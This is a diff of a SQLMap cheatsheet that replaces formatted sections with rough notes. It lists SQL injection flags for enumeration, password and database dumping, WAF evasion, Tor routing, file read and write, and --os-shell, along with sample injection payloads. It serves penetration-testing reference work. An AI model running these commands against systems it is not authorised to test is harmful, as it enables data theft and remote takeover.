@@ -1,26 +1,5 @@
 # SQLMap Command Cheatsheet
 
-## Table of Contents
-
-1. [Basic Usage & Target Specification](#basic-usage--target-specification)
-2. [Database Enumeration](#database-enumeration)
-3. [System Information](#system-information)
-4. [Advanced Exploitation](#advanced-exploitation)
-5. [Detection & Testing Options](#detection--testing-options)
-6. [Performance & Stealth](#performance--stealth)
-7. [Bypass & Evasion](#bypass--evasion)
-8. [Session & Output Management](#session--output-management)
-9. [Request Handling & Methods](#request-handling--methods)
-10. [Automation & Discovery](#automation--discovery)
-11. [Payload Customization](#payload-customization)
-12. [Response Analysis](#response-analysis)
-13. [Advanced Enumeration](#advanced-enumeration)
-14. [Data Extraction & Formatting](#data-extraction--formatting)
-15. [Security & Anonymity](#security--anonymity)
-16. [Common Command Combinations](#common-command-combinations)
-
----
-
 ## Basic Usage & Target Specification
 
 ### Target Options
@@ -261,7 +240,7 @@ sqlmap -r request.txt --tamper=space2comment,randomcase
 --tamper=greatest           # > to GREATEST()
 ```
 
-## Session & Output Management
+## Session & Output
 
 ### Session Management
 ```bash
@@ -319,7 +298,7 @@ sqlmap -r request.txt --level=5 --risk=3 --threads=10 --technique=BEUST --batch
 sqlmap -r request.txt --delay=2 --random-agent --tamper=space2comment,randomcase,charencode --level=3
 ```
 
-## Request Handling & Methods
+## POST Data & Forms
 
 ### POST Requests
 ```bash
@@ -431,198 +410,204 @@ sqlmap -X POST "http://example.com/login" -d "user=admin&pass=test" -H "Cookie: 
 sqlmap -r request_from_curl.txt
 ```
 
-## Payload Customization
+NEW ADDONS:
 
-### Payload Structure
-SQLMap payloads consist of two parts:
-- **Attack Vector**: The actual injection string
-- **Boundaries**: Prefix and suffix that wrap the vector to make it a valid query
+payloads consist of 2 parts.
 
-### Custom Payload Options
-```bash
-# Add custom prefix to payloads
-sqlmap -r request.txt --prefix="')"
+one is attack vector, the actual injection string.
+the other is boundaries, prefix and suffix. which wraps the vector to make it a valid query with the oringial one.
 
-# Add custom suffix to payloads
-sqlmap -r request.txt --suffix="-- -"
+--suffix
 
-# Show payloads in response (verbose)
-sqlmap -r request.txt -v 3
+to give a suffix to the payloads.
 
-# Combine prefix and suffix
-sqlmap -r request.txt --prefix="')" --suffix="-- -"
-```
+--prefix
 
-### Risk and Level Configuration
-```bash
-# Set testing level (1-5, focuses on multiple entry points)
-sqlmap -r request.txt --level=3    # Tests cookies, user agents
-sqlmap -r request.txt --level=5    # Maximum entry points
+to give a prefix to the payloads.
 
-# Set risk level (1-3)
-sqlmap -r request.txt --risk=1     # Safe SELECT statements only
-sqlmap -r request.txt --risk=2     # Adds time-based blind tests
-sqlmap -r request.txt --risk=3     # Dangerous OR queries (can affect UPDATE/DELETE)
-```
+-v 
 
-### Risk Level Details
-| Risk        | Description                 | Example Payloads                                      | When to Use                           |
-| ----------- | --------------------------- | ----------------------------------------------------- | ------------------------------------- |
-| 1 (Default) | Safe SELECT-based tests     | `' OR 1=1-- -`<br>`' AND 1=2 UNION ALL SELECT...`     | Always start here                     |
-| 2           | Adds time-based blind tests | `' OR SLEEP(5)-- -`<br>`'; WAITFOR DELAY '0:0:5'-- -` | When Risk 1 finds nothing             |
-| 3           | OR-based boolean tests      | `' OR 'a'='a'`                                        | **Dangerous!** Can affect all records |
+to show the payloads in the resposne
 
-### Error Parsing
-```bash
-# Enable DBMS error message parsing
-sqlmap -r request.txt --parse-errors
-```
+--level=
 
-## Response Analysis
+to set the level of tests to perform, from 1 to 5. higher levels include more tests and focsues on multiple entry ppints like referrers, cookies, user agents etc.
 
-### Response Differentiation
-```bash
-# Detect based on HTTP status code
-sqlmap -r request.txt --code=200
+--risk=
 
-# Detect based on page title changes
-sqlmap -r request.txt --titles
+to set the risk,
 
-# Detect based on specific string presence
-sqlmap -r request.txt --string="Welcome back"
+Risk Level	Description	Example Payloads / Behaviors	When to Use
+Risk 1 (Default)	Safe & Default. Uses a large number of low-intrusive, standard SQL injection tests. These are mostly SELECT-based statements.	' OR 1=1-- -
+' AND 1=2 UNION ALL SELECT...	Always start here. It's safe for the vast majority of testing.
+Risk 2	Adds time-based blind SQL injection tests. Enables heavier and more time-consuming queries.	Adds payloads like:
+' OR SLEEP(5)-- -
+'; WAITFOR DELAY '0:0:5'-- -	When Risk 1 finds nothing, or you specifically suspect a time-based blind vulnerability.
+Risk 3	Adds OR-based boolean tests. This is the dangerous level, as OR conditions can affect UPDATE or DELETE statements.	Adds payloads like:
+' OR 'a'='a'
+If injected into a UPDATE users SET password='...' WHERE id=1, it could become:
+UPDATE users SET password='' OR 'a'='a' WHERE id=1
+This would reset passwords for ALL users!
 
-# Ignore HTML tags, focus on text content
-sqlmap -r request.txt --text-only
-```
 
-## Advanced Enumeration
+--parse-errors
 
-### Comprehensive Database Information
-```bash
-# Database version banner
-sqlmap -r request.txt --banner
+to enable parsing of DBMS error messages for more accurate injection detection and exploitation.
 
-# Current user name
-sqlmap -r request.txt --current-user
+--proxy=''
 
-# All database names
-sqlmap -r request.txt --dbs
+to route traffic through a proxy server for monitoring or debugging purposes.
 
-# Current database name
-sqlmap -r request.txt --current-db
 
-# Check if current user has DBA rights
-sqlmap -r request.txt --is-dba
+We can differentiate between valid or invalid results by
 
-# Get user passwords
-sqlmap -r request.txt --passwords
+--code=200
+for change in response code
 
-# Perform all enumeration options
-sqlmap -r request.txt --all --batch
-```
+--titles
 
-### Advanced Table and Column Operations
-```bash
-# Get schema of all tables
-sqlmap -r request.txt --schema
+for change in page titles
 
-# Search for specific string in table/column
-sqlmap -r request.txt --search -T users -C username -S "admin"
+--string=''
 
-# List specific columns only
-sqlmap -r request.txt -D database -T table -C "username,password,email"
-```
+for presence of a string in the response
 
-### Union-Based Injection Options
-```bash
-# Specify number of columns for UNION
-sqlmap -r request.txt --union-cols=5
+--text-only
 
-# Specify character for UNION-based injections
-sqlmap -r request.txt --union-char="NULL"
+to ignore HTML tags and focus on textual content changes in the response.
 
-# Specify table for UNION (required for some DBMS like PostgreSQL)
-sqlmap -r request.txt --union-from="information_schema.tables"
 
-# Technique specification (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
-sqlmap -r request.txt --technique=BEUST
-```
+--tehcnique=
 
-## Data Extraction & Formatting
+to specify which SQL injection techniques to use. Options include:
+B: Boolean-based blind
+E: Error-based
+U: Union-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
 
-### Row-Specific Extraction
-```bash
-# Specify starting row for data dumping
-sqlmap -r request.txt -D database -T table --start=10
+--union-cols=<number>
 
-# Specify ending row for data dumping
-sqlmap -r request.txt -D database -T table --stop=20
+to specify the number of columns for UNION-based injections.
 
-# Combine start and stop
-sqlmap -r request.txt -D database -T table --start=10 --stop=20
-```
+--union-char=<char>
+to specify a character to use for UNION-based injections.
 
-### Conditional Data Extraction
-```bash
-# Conditional enumeration with WHERE clause
-sqlmap -r request.txt -D database -T users --where="id>100"
+--union-from=<table>
 
-# Exclude system databases
-sqlmap -r request.txt --dump-all --exclude-sysdbs
-```
+to specify a table to use for UNION-based injections for some dbms which is requied by some dbms like postgresql.
 
-### Output Formatting
-```bash
-# Dump data in CSV format
-sqlmap -r request.txt -D database -T table --dump-format=CSV
 
-# Dump data in HTML format
-sqlmap -r request.txt -D database -T table --dump-format=HTML
+Enumeration
 
-# Dump data in SQL format
-sqlmap -r request.txt -D database -T table --dump-format=SQL
-```
 
-## Security & Anonymity
+Database version banner (switch --banner)
+Current user name (switch --current-user)
+all database names (switch --dbs)
+Current database name (switch --current-db)
+Checking if the current user has DBA (administrator) rights (switch --is-dba)
 
-### CSRF and Session Management
-```bash
-# Handle CSRF tokens
-sqlmap -r request.txt --csrf-token="csrf_token"
+Table and Column Enumeration
 
-# Randomize parameter values
-sqlmap -r request.txt --randomize="session_id"
+List of tables in a database (switch -D <database> --tables)
+List of columns in a table (switch -D <database> -T <table> --
+columns)
+List rows of only specific columns (switch -C <column1,column2,...>)
 
-# Evaluate Python expressions in payloads
-sqlmap -r request.txt --eval="import hashlib; hash=hashlib.md5(id).hexdigest()"
-```
+--start=<row>
+to specify the starting row for data dumping.
 
-### Proxy and Anonymity
-```bash
-# Route through single proxy
-sqlmap -r request.txt --proxy="http://127.0.0.1:8080"
+--stop=<row>
+to specify the ending row for data dumping.
+to limit the number of rows to dump.
 
-# Use multiple proxies from file
-sqlmap -r request.txt --proxy-file="proxies.txt"
+Conditional enumeration
 
-# Route through Tor network
-sqlmap -r request.txt --tor
+--where='<condition>'
+to specify a condition for data dumping.
 
-# Check Tor connection
-sqlmap -r request.txt --check-tor
-```
+Full DB enumeration
 
-### WAF Evasion Advanced
-```bash
-# Skip WAF detection
-sqlmap -r request.txt --skip-waf
+--dump-all
+to dump all databases, tables, and columns.
 
-# Use random User-Agent
-sqlmap -r request.txt --random-agent
+--dump
+to dump the contents of a specified table.
 
-# Multiple tamper scripts
-sqlmap -r request.txt --tamper="space2comment,randomcase,charencode"
+--dump -D <database> -T <table>
+to dump a specific table from a specific database.
 
-# HTTP Parameter Pollution/Chunked encoding
-sqlmap -r request.txt --chunked
-```
+--exclude-sysdbs
+to exclude system databases from enumeration and dumping.
+
+Data Extraction formatting options
+
+--dump-format=CSV
+to dump data in CSV format.
+
+--dump-format=HTML
+to dump data in HTML format.
+
+--dump-format=SQL
+to dump data in SQL format.
+
+
+--schema 
+to get schema of all the tables 
+
+--search -T <table> -C <column> -S <string>
+to search for a specific string in a given table and column.
+
+--passwords
+to retrieve user passwords from the database.
+
+--all 
+to perform all enumeration options in one go when used in combination with --batch.
+
+--csrf-token=<token_parameter_name>
+to specify a CSRF token for requests that require it.
+
+--randomize=<parameter_name>
+to randomize the value of a specific parameter for each request.
+
+
+--eval='<python_expression>'
+to evaluate a Python expression and use its result in the injection payloads.
+
+--proxy='<proxy_url>'
+to route traffic through a proxy server for monitoring or debugging purposes
+
+--proxy-file='<file_path>'
+to read a list of proxy servers from a file and rotate through them for each request.
+
+--tor
+to route traffic through the Tor network for anonymity.
+
+--check-tor
+to check if the Tor connection is working properly.
+
+--skip-waf
+to skip WAF detection and evasion techniques.
+
+--random-agent
+to use a random User-Agent header for each request to evade detection.
+
+Tamper scripts
+
+--tamper=<script1,script2,...>
+to specify one or more tamper scripts to modify the payloads for evasion.
+
+--chunked
+to enable chunked transfer encoding for requests or to use http parameter pollution techniques.
+
+OS eploitation
+
+--file-read='<file_path>'
+to read a file from the target system.
+
+--file-write='<local_file>' --file-dest='<remote_file>'
+to write a local file to the target system.
+
+--os-shell
+to get an interactive operating system shell on the target system.
